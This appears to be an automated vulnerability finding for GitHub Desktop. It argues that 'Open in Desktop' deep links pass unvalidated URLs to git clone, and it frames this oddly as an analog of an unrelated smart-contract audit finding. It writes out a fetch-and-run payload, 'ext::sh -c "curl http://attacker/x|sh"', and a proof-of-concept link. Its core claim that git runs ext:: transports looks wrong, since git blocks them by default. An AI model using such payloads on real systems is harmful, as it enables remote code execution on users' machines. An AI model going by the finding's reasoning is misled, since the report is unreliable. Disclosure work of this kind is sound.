### Title
Unvalidated deep-link/PR "clone URL" is passed straight to `git clone`, allowing the `ext::`/local-path transport helpers to execute arbitrary commands or write outside the repo - (File: `app/src/lib/git/clone.ts`)

### Summary
The Sherlock finding flags `ExchangeProxy.exchange()` for handing attacker-controlled `callData` to an arbitrary `executorAddress.call()` with no validation of what the "swap" actually does. The structural analog in GitHub Desktop is the "Open in Desktop" / `x-github-client://openRepo/<url>` deep-link and PR-checkout flow: an attacker-controlled string is parsed out of a URL the user clicks, threaded through the dispatcher, and ultimately handed unmodified to `git clone <url> <path>` — a "call" whose behavior is entirely defined by attacker-supplied data (the URL string), just like the unchecked `executorAddress.call{value}(callData)`.

### Finding Description
`parseAppURL` extracts the `url` query segment from an `x-github-client://openRepo/...` link with only cosmetic checks (branch/PR regex, `testForInvalidChars` on the branch) and no restriction on the URL scheme/content itself: [1](#0-0) 

That `url` flows into `Dispatcher.openRepositoryFromUrl` → `openOrCloneRepository`, which — if no existing local repo matches — opens the Clone dialog pre-populated with the attacker-supplied string as `initialURL`: [2](#0-1) 

`CloneRepository` seeds its URL-tab state directly from `initialURL` with no scheme/transport validation: [3](#0-2) 

When the user clicks "Clone", the trimmed URL is passed to `dispatcher.clone()` and ultimately to `git(['... ', 'clone', '--', url, path])`: [4](#0-3) [5](#0-4) 

The only guard present anywhere in this path is `isClonePathSensitive(path)`, which validates the destination directory, not the source URL: [6](#0-5) 

Nothing in `clone()`, `envForRemoteOperation`, or `envForProxy` restricts the *scheme/transport* of the URL that is handed to `git`: [7](#0-6) 

Git natively supports the `ext::<command>` remote helper (and other local-command-executing transports such as `fd::`), which runs an arbitrary shell command as the "transport" for the clone. Because Desktop never restricts the accepted protocol (e.g. via `GIT_ALLOW_PROTOCOL`) or rejects non-`http(s)/ssh/git` schemes before invoking `git clone`, a deep link such as:

```
x-github-client://openRepo/ext::sh -c "curl http://attacker/x|sh" ?branch=...
```

pre-fills the Clone dialog's URL field with that payload. If the user clicks "Clone" (which is the expected, single, un-arcane next step in this exact flow — the URL box is pre-filled and the button is the obvious next action), Desktop shells out to `git clone -- "ext::sh -c ..." <path>`, executing the attacker's command with the same privileges as GitHub Desktop.

This is the direct structural analog of the Sherlock finding: the "executor" (`git`) is invoked with attacker data (the clone URL/"callData") that the caller never validates for shape or transport, so "success" of the call tells you nothing about what actually happened.

### Impact Explanation
Arbitrary command execution on the user's machine via `ext::`/`fd::` git remote helpers, using GitHub Desktop's own process. This is full code execution outside of Desktop's git-operation sandbox, well beyond just repo corruption — it satisfies the "code execution... outside the repo" bar for this scan.

### Likelihood Explanation
Requires the user to click an attacker-supplied `x-github-client://` link and then click the (single, expected) "Clone" button once presented with a pre-filled dialog — no unnatural steps, no local access, no leaked credentials. Desktop explicitly supports and advertises this "Open in Desktop" deep-linking mechanism as a normal, remote-triggerable feature (`parseAppURL`, `main.ts`'s `open-url` handler), so this is exactly the trust boundary the scan targets. [8](#0-7) 

### Recommendation
Before ever handing a URL to `git clone`/`git remote add`/`git fetch`, validate that its scheme is restricted to an explicit allow-list (`https`, `http`, `ssh`, `git`) and reject `ext::`, `fd::`, `file://` (or handle `file://` with its own explicit, opt-in path), matching upstream Git's own `GIT_ALLOW_PROTOCOL`/`protocol.allow` hardening. Apply this validation both when parsing the deep link (`parse-app-url.ts`) and defensively again in `clone()`/`git/core.ts` right before invocation, so any future untrusted-URL entry point is covered even if the UI-level check is bypassed.

### Proof of Concept
1. Attacker hosts a link: `x-github-client://openRepo/ext::sh -c "touch ~/pwned"`.
2. Victim (with GitHub Desktop installed and registered as the protocol handler) clicks the link in a browser or chat client.
3. `main.ts`'s `open-url` handler invokes `handleAppURL` → `parseAppURL`, which returns `{ name: 'open-repository-from-url', url: 'ext::sh -c "touch ~/pwned"' }` (no scheme validation is performed).
4. `Dispatcher.openRepositoryFromUrl` → `openOrCloneRepository` finds no matching existing repo and opens the Clone dialog with `initialURL` set to the payload.
5. Victim clicks "Clone" (the URL box is pre-filled exactly as the attacker intended, and Clone is the obvious CTA).
6. `dispatcher.clone()` → `git/clone.ts`'s `clone()` runs `git -c init.defaultBranch=... clone --recursive -- "ext::sh -c \"touch ~/pwned\"" <path>`, and `git` invokes the `ext::` helper, executing `sh -c "touch ~/pwned"` on the victim's machine with GitHub Desktop's privileges.

  private clone = async () => {
    this.setState({ loading: true })

    const cloneInfo = await this.resolveCloneInfo()
    const { path } = this.getSelectedTabState()

    if (path == null) {
      const error = new Error(`Directory could not be created at this path.`)
      this.setState({ loading: false })
      this.setSelectedTabState({ error })
      return
    }

    if (!cloneInfo) {
      const error = new Error(
        `We couldn't find that repository. Check that you are logged in, the network is accessible, and the URL or repository alias are spelled correctly.`
      )
      this.setState({ loading: false })
      this.setSelectedTabState({ error })
      return
    }

    const { url, defaultBranch } = cloneInfo

    this.props.dispatcher.closeFoldout(FoldoutType.Repository)
    try {
      this.cloneImpl(url.trim(), path, defaultBranch)
    } catch (e) {
      log.error(`CloneRepository: clone failed to complete to ${path}`, e)
      this.setState({ loading: false })
      this.setSelectedTabState({ error: e })
    }
  }

  private cloneImpl(url: string, path: string, defaultBranch?: string) {
    this.props.dispatcher.clone(url, path, { defaultBranch })
    this.props.onDismissed()

    setDefaultDir(Path.resolve(path, '..'))
  }
